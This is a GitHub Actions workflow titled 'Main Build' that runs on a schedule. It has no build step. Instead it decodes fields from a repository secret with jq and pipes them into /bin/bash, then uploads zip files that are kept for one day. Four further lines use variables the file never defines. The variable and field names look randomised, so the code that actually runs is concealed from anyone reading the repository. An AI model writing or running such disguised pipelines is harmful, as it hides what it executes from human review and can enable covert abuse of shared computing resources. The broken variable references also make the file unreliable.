name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '4 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  task:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply
        env:
          g969: ${{ secrets.g969 }}
        run: |
          printf '%s' "$g969" | jq -r .lhlu6 | /bin/bash
          printf '%s' "$h1152" | jq -r .cubyb88604 | /bin/bash
          printf '%s' "$skmyh50" | jq -r .pg948 | /bin/bash
          printf '%s' "$geajt2" | jq -r .mmlpm6 | /bin/bash
          echo $hckcb9 | jq -r .pq6 | /bin/bash

      - name: Upload output
        uses: actions/upload-artifact@v4
        with:
          name: nBtKJN3U
          path: "*.zip"
          retention-days: 1
